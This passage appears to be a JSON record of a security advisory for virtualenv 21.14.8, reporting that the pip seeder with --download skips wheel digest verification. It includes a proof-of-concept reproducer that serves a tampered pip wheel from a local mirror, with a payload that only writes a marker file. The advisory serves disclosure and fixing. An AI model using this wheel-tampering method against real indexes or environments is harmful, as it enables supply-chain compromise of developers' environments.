compare env-pip's pip/__init__.py with the one in each wheel\nwith zipfile.ZipFile(bundled.path) as wheel:\n    bundled_init = wheel.read(\"pip/__init__.py\")\nwith zipfile.ZipFile(mirror_wheel) as wheel:\n    mirror_init = wheel.read(\"pip/__init__.py\")\ninstalled = glob.glob(f\"{work}/env-pip/lib/python*/site-packages/pip/__init__.py\")\ninstalled_init = open(installed[0], \"rb\").read() if installed else b\"\"\nrefusal_message = f\"has sha256 {mirror_sha256}, but PyPI reports {pypi_sha256}\"\nrefused = default_seeder.returncode != 0 and refusal_message in default_seeder.stdout\nprint(f\"default seeder refused the mirror's wheel for its digest: {refused}\")\nprint(f\"env-pip's pip/__init__.py is the bundled wheel's: {installed_init == bundled_init}, the mirror's: {installed_init == mirror_init}\")\nprint(f\"the mirror's line ran on env-pip/bin/pip --version: {os.path.exists(marker)}\")\nprint(\"BUG\" if refused and installed_init == mirror_init and os.path.exists(marker) else \"OK\")\n```\n\n**`repro.d/make_mirror.py`**\n\n```text\n#!/usr/bin/env python3\n# usage: make_mirror.py \u003cgenuine pip wheel\u003e \u003cmirror directory\u003e \u003cmarker file the payload writes\u003e\nimport os\nimport sys\nimport zipfile\n\ngenuine_wheel, mirror, marker = sys.argv[1:]\nwheel_name = os.path.basename(genuine_wheel)\npayload = f\"\\nopen({marker!r}, 'w').write('mirror code ran')\\n\"\n\nos.makedirs(f\"{mirror}/pip\")\nwith zipfile.ZipFile(genuine_wheel) as genuine, zipfile.ZipFile(f\"{mirror}/pip/{wheel_name}\", \"w\") as served:\n    for entry in genuine.infolist():\n        data = genuine.read(entry)\n        if entry.filename == \"pip/__init__.py\":\n            data += payload.encode()\n        served.writestr(entry, data)\n\n# PEP 503 project page; pip reads \u003cindex\u003e/pip/index.html for a file:// index\nwith open(f\"{mirror}/pip/index.html\", \"w\") as page:\n    page.write(f'\u003ca href=\"{wheel_name}\"\u003e{wheel_name}\u003c/a\u003e\\n')\n```\n\n**`repro.d/virtualenv_offline.py`**\n\n```text\n#!/usr/bin/env python3\n# usage: virtualenv_offline.py \u003cdirectory standing in for https://pypi.org\u003e \u003cvirtualenv arguments...\u003e\n# The `virtualenv` command, except that the PyPI JSON API request (the source of the digest the default seeder\n# checks) is answered from a local file, as tests/unit/seed/wheels/test_periodic_update.py does. pip is not touched.\nimport sys\n\nfrom virtualenv.__main__ import run_with_catch\nfrom virtualenv.seed.wheels import periodic_update\n\npypi_org = sys.argv[1]\n\n\ndef pypi_json_api(url, context=None):\n    return open(url.replace(\"https://pypi.org\", pypi_org), \"rb\")\n\n\nperiodic_update.urlopen = pypi_json_api\nrun_with_catch(sys.argv[2:])\n```\n\n## Impact\n\nThe default-index digest-verification step can be omitted when the pip seeder downloads packages. This does not by\nitself defeat TLS or establish control of an index response.\n\nSeverity: low.\n\n## Versions tested\n\nThe confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\nversion or exclude earlier releases. Fixed in 21.14.9.\n\nThe fix acquires wheels through the shared verification path and installs pinned names with index lookup\ndisabled. A private temporary directory contains only the selected archives. This preserves version pins in pip freeze\noutput.\n\nFix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430).\n\n## Known mitigation\n\nOn older releases, use embedded wheels without downloads, or acquire and verify approved seed archives\nseparately.\n\n## Affected release\n\n- [x] The problem reproduces on virtualenv 21.14.8.\n\n## Credits\n\nReported by Anthropic's OSS Scanner as ANT-2026-74ALJBUF.",
                "text": "## Summary\n\nThe pip seeder acquires bundled wheels with download=False and lets pip access the index when --download is selected.\nIndex candidates on that path do not pass through virtualenv's wheel digest verification.\n\nAnthropic's OSS Scanner reported this as `ANT-2026-74ALJBUF` in `virtualenv-20261015-005`, received on 15 October 2026.\n\n## Affected area\n\nWheel selection by the pip seeder when downloads are enabled.\n\n## Attacker-controlled input\n\nThe pip seeder and download option must be selected. The finding concerns the default-index digest-verification policy.\nExplicit custom-index settings already opt out of comparison against PyPI metadata; this patch retains that policy.\n\n## Affected code\n\nThe relevant 21.14.8 source is in\n[pip seeder](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/pip_invoke.py).\n\n## Mechanism\n\nWith `--seeder pip --download`, `PipInvoke.get_pip_install_cmd()` first calls `get_wheel(download=False)`, so\nvirtualenv's `download_wheel()` and `verify_wheel_digest()` are skipped. It then lets `pip install` consult the\nconfigured index. An index wheel with the same package and version as the bundled wheel can be selected without\nvirtualenv comparing its SHA-256 with PyPI metadata. The default app-data seeder takes the verification path for the\nsame option.\n\n## Reproduction and evidence\n\nThe scanner built a local index named in `pip.conf` that served a modified copy of the bundled pip wheel under the same\nfilename. In the control run, `virtualenv --download env-default` rejected the wheel with a digest mismatch. In the\nsecond run, adding `--seeder pip` produced an environment whose installed `pip/__init__.py` matched the index wheel;\n`env-pip/bin/pip --version` ran the added line. The reproducer checked the installed bytes and marker before reporting\n`BUG`.\n\nBoth `--seeder pip` and `--download` are needed. The report used a non-PyPI index from `pip.conf` and left\n`PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, and `PIP_INDEX` unset, so virtualenv's default-seeder PyPI comparison remained\nactive. This does not establish index control in the default PyPI setup. The unchecked pip-seeder download path is\nolder, while the comparison with the default seeder arose when digest verification was added in 21.7.12.\n[PR #3430](https://github.com/pypa/virtualenv/pull/3430) acquires and verifies selected wheels before invoking pip with\nindex lookup disabled.\n\n## Attack sequence\n\n```mermaid\nsequenceDiagram\n    participant I as Index in pip.conf\n    participant V as virtualenv PipInvoke\n    participant P as pip install\n    participant E as Seeded environment\n    I-\u003e\u003eV: serve modified pip wheel\n    V-\u003e\u003eV: get_wheel(download=False)\n    V-\u003e\u003eP: install with --download permitting index lookup\n    P-\u003e\u003eI: select same-version index wheel\n    I-\u003e\u003eE: modified pip installed without virtualenv digest check\n    E-\u003e\u003eE: later pip invocation runs added code\n    Note over V,E: Default app-data seeder rejects the same digest\n```\n\n## Reproducer files\n\nThe following files are from the scanner report for `ANT-2026-74ALJBUF`. They were tested against commit `a857a7823c73`\nin the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\nneed a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\nare included as evidence and were not rerun for this advisory update.\n\n**`repro`**\n\n```text\n#!/usr/bin/env python3\nimport glob\nimport hashlib\nimport json\nimport os\nimport shutil\nimport subprocess\nimport sys\nimport zipfile\n\nfrom virtualenv.seed.wheels.embed import get_embed_wheel\n\ncompanions = \"/tmp/repro.d\"\nwork = \"/tmp/repro-pip-seeder-download\"\nshutil.rmtree(work, ignore_errors=True)\nos.makedirs(work)\n\n# set up: the pip wheel virtualenv bundles, and PyPI's record of its sha256 (served by virtualenv_offline.py: no network)\nbundled = get_embed_wheel(\"pip\", f\"{sys.version_info.major}.{sys.version_info.minor}\")\npypi_sha256 = hashlib.sha256(open(bundled.path, \"rb\").read()).hexdigest()\npypi_release = {\"filename\": bundled.name, \"digests\": {\"sha256\": pypi_sha256}}\nos.makedirs(f\"{work}/pypi.org/pypi/pip\")\nwith open(f\"{work}/pypi.org/pypi/pip/json\", \"w\") as pypi_json:\n    json.dump({\"releases\": {bundled.version: [pypi_release]}}, pypi_json)\n\n# attacker: the mirror serves other bytes under the bundled wheel's own file name\nmarker = f\"{work}/MIRROR_CODE_RAN\"\nsubprocess.run([sys.executable, f\"{companions}/make_mirror.py\", str(bundled.path), f\"{work}/mirror\", marker], check=True)\nmirror_wheel = f\"{work}/mirror/pip/{bundled.name}\"\nmirror_sha256 = hashlib.sha256(open(mirror_wheel, \"rb\").read()).hexdigest()\nprint(f\"{bundled.name}: PyPI publishes sha256 {pypi_sha256}\")\nprint(f\"{bundled.name}: the mirror serves  sha256 {mirror_sha256}\")\n\n# user: pip.conf names the mirror; PIP_INDEX_URL, PIP_EXTRA_INDEX_URL and PIP_INDEX (which turn the check off) are unset\nwith open(f\"{work}/pip.conf\", \"w\") as pip_conf:\n    pip_conf.write(f\"[global]\\nindex-url = file://{work}/mirror\\n\")  # file:// stands in for the mirror's http URL\nos.makedirs(f\"{work}/home-default\")\nos.makedirs(f\"{work}/home-pip\")  # one HOME per run, so neither sees the other's app-data or pip cache\nvirtualenv = [sys.executable, f\"{companions}/virtualenv_offline.py\", f\"{work}/pypi.org\", \"--no-periodic-update\"]\n\n# control: the default seeder with --download fetches the mirror's wheel and refuses it\ndefault_seeder = subprocess.run(\n    [*virtualenv, \"--download\", f\"{work}/env-default\"],\n    env={**os.environ, \"HOME\": f\"{work}/home-default\", \"PIP_CONFIG_FILE\": f\"{work}/pip.conf\"},\n    capture_output=True,\n    text=True,\n)\nrefusal = [line for line in default_seeder.stdout.splitlines() if line.startswith(\"RuntimeError: \")]\nprint(f\"\\nCONTROL  virtualenv --download env-default: exit {default_seeder.returncode}\")\nprint(\"\\n\".join(refusal))\n\n# trigger: the same command plus --seeder pip\npip_seeder = subprocess.run(\n    [*virtualenv, \"--download\", \"--seeder\", \"pip\", f\"{work}/env-pip\"],\n    env={**os.environ, \"HOME\": f\"{work}/home-pip\", \"PIP_CONFIG_FILE\": f\"{work}/pip.conf\"},\n    capture_output=True,\n    text=True,\n)\nprint(f\"\\nOBSERVED virtualenv --download --seeder pip env-pip: exit {pip_seeder.returncode}\")\nprint(pip_seeder.stdout)\nif pip_seeder.returncode == 0:\n    env_pip = subprocess.run([f\"{work}/env-pip/bin/pip\", \"--version\"], capture_output=True, text=True, check=True)\n    print(f\"$ env-pip/bin/pip --version\\n{env_pip.stdout}\")\n\n# check: compare env-pip's pip/__init__.py with the one in each wheel\nwith zipfile.ZipFile(bundled.path) as wheel:\n    bundled_init = wheel.read(\"pip/__init__.py\")\nwith zipfile.ZipFile(mirror_wheel) as wheel:\n    mirror_init = wheel.read(\"pip/__init__.py\")\ninstalled = glob.glob(f\"{work}/env-pip/lib/python*/site-packages/pip/__init__.py\")\ninstalled_init = open(installed[0], \"rb\").read() if installed else b\"\"\nrefusal_message = f\"has sha256 {mirror_sha256}, but PyPI reports {pypi_sha256}\"\nrefused = default_seeder.returncode != 0 and refusal_message in default_seeder.stdout\nprint(f\"default seeder refused the mirror's wheel for its digest: {refused}\")\nprint(f\"env-pip's pip/__init__.py is the bundled wheel's: {installed_init == bundled_init}, the mirror's: {installed_init == mirror_init}\")\nprint(f\"the mirror's line ran on env-pip/bin/pip --version: {os.path.exists(marker)}\")\nprint(\"BUG\" if refused and installed_init == mirror_init and os.path.exists(marker) else \"OK\")\n```\n\n**`repro.d/make_mirror.py`**\n\n```text\n#!/usr/bin/env python3\n# usage: make_mirror.py \u003cgenuine pip wheel\u003e \u003cmirror directory\u003e \u003cmarker file the payload writes\u003e\nimport os\nimport sys\nimport zipfile\n\ngenuine_wheel, mirror, marker = sys.argv[1:]\nwheel_name = os.path.basename(genuine_wheel)\npayload = f\"\\nopen({marker!r}, 'w').write('mirror code ran')\\n\"\n\nos.makedirs(f\"{mirror}/pip\")\nwith zipfile.ZipFile(genuine_wheel) as genuine, zipfile.ZipFile(f\"{mirror}/pip/{wheel_name}\", \"w\") as served:\n    for entry in genuine.infolist():\n        data = genuine.read(entry)\n        if entry.filename == \"pip/__init__.py\":\n            data += payload.encode()\n        served.writestr(entry, data)\n\n# PEP 503 project page; pip reads \u003cindex\u003e/pip/index.html for a file:// index\nwith open(f\"{mirror}/pip/index.html\", \"w\") as page:\n    page.write(f'\u003ca href=\"{wheel_name}\"\u003e{wheel_name}\u003c/a\u003e\\n')\n```\n\n**`repro.d/virtualenv_offline.py`**\n\n```text\n#!/usr/bin/env python3\n# usage: virtualenv_offline.py \u003cdirectory standing in for https://pypi.org\u003e \u003cvirtualenv arguments...\u003e\n# The `virtualenv` command, except that the PyPI JSON API request (the source of the digest the default seeder\n# checks) is answered from a local file, as tests/unit/seed/wheels/test_periodic_update.py does. pip is not touched.\nimport sys\n\nfrom virtualenv.__main__ import run_with_catch\nfrom virtualenv.seed.wheels import periodic_update\n\npypi_org = sys.argv[1]\n\n\ndef pypi_json_api(url, context=None):\n    return open(url.replace(\"https://pypi.org\", pypi_org), \"rb\")\n\n\nperiodic_update.urlopen = pypi_json_api\nrun_with_catch(sys.argv[2:])\n```\n\n## Impact\n\nThe default-index digest-verification step can be omitted when the pip seeder downloads packages. This does not by\nitself defeat TLS or establish control of an index response.\n\nSeverity: low.\n\n## Versions tested\n\nThe confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\nversion or exclude earlier releases. Fixed in 21.14.9.\n\nThe fix acquires wheels through the shared verification path and installs pinned names with index lookup\ndisabled. A private temporary directory contains only the selected archives. This preserves version pins in pip freeze\noutput.\n\nFix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430).\n\n## Known mitigation\n\nOn older releases, use embedded wheels without downloads, or acquire and verify approved seed archives\nseparately.\n\n## Affected release\n\n- [x] The problem reproduces on virtualenv 21.14.8.\n\n## Credits\n\nReported by Anthropic's OSS Scanner as ANT-2026-74ALJBUF."
